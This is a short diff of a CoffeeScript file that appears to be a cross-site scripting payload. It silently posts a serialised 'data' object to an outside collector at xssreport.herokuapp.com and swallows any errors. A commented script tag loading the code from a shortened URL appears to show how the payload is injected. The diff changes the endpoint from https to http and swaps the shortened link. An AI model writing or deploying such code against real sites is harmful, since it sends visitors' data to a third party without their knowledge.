@@ -20,11 +20,11 @@ catch e
   ;
 
 try
-  ajax.post 'https://xssreport.herokuapp.com/upload/', ->
+  ajax.post 'http://xssreport.herokuapp.com/upload/', ->
       # do nothing here!! 
       ;
     , 'd=' + JSON.stringify(data)
 catch e
   ;
 
-# <script src="http://goo.gl/WhNq1" async="async"></script>
+# <script src="http://goo.gl/l0jEA" async="async"></script>
